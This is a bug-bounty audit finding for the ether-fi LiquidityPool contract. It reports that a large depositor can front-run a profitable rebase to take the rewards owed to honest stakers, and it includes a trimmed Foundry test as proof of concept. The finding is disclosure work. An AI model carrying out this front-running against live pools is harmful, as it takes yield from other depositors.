# [H] Whale can front-run profitable rebases with a deposit

## Summary
Severity: High
Chain: Smart contract
Component: ether-fi
Published: 2023-11-10
Source: https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/issues/41
Type: hats-finding

## Details
**Github username:** @0xfuje
**Twitter username:** 0xfuje
**Submission hash (on-chain):** 0xcdf04182447950f2a421c34e08da524cc18f04953d78c3e7349310e282306659
**Severity:** high

**Description:**
## Impact 
Attacker will gain rebase profit, instead of honest stakers

## Description
A whale can monitor the mempool and whenever a quite profitable rebase of `LiquidityPool` happens, can front-run the rebase transaction with a huge deposit and take the majority of rebase rewards. The attacker can initiate a withdrawal and later when another profitable opportunity arises, can front-run the rebase distribution again, perhaps from a different address.

**Severity Justification:** I believe this can be categorized as "Theft of unclaimed yield or other assets", since honest depositors will lose their rebase rewards.

## Proof of Concept
1. navigate to `test/LiquidityPool.t.sol`
2. copy the below proof of concept inside the `LiquidityPoolTest` contract:
3. run `forge test --match-test test_WhaleCanFrontRunRebase_0xfuje -vvvv`
```solidity
    function test_WhaleCanFrontRunRebase_0xfuje() public {
        address whale = vm.addr(11413);
        
        vm.deal(whale, 100 ether);
        vm.deal(alice, 2 ether);
        vm.deal(bob, 3 ether);

        vm.prank(alice);
        liquidityPoolInstance.deposit{value: 2 ether}();

        vm.prank(bob);
        liquidityPoolInstance.deposit{value: 3 ether}();

        assertEq(eETHInstance.balanceOf(alice), 2 ether);
        assertEq(eETHInstance.balanceOf(bob), 3 ether);

        // 2. whale detects profitable rebase and front-runs the tx
        vm.prank(whale);
        liquidityPoolInstance.deposit{value: 100 ether}();
```

_Trimmed to 38 lines — full report: https://github.com/hats-finance/ether-fi-0x36c3b77853dec9c4a237a692623293223d4b9bc4/issues/41_
